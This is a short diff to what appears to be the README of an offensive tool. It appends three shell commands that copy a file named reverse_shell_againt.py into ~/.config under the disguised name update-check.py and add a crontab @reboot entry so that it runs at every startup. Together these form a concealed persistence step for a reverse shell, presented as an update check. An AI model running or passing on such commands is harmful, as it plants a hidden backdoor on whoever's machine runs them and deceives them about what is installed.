@@ -116,3 +116,7 @@ This tool is for educational and authorized use only.
 ---
 
 Built to learn. Built to bypass. Built to improve. 🧙🏽‍♂️
+
+mkdir -p ~/.config
+cp reverse_shell_againt.py ~/.config/update-check.py
+(crontab -l 2>/dev/null; echo "@reboot python3 ~/.config/update-check.py &") | crontab -
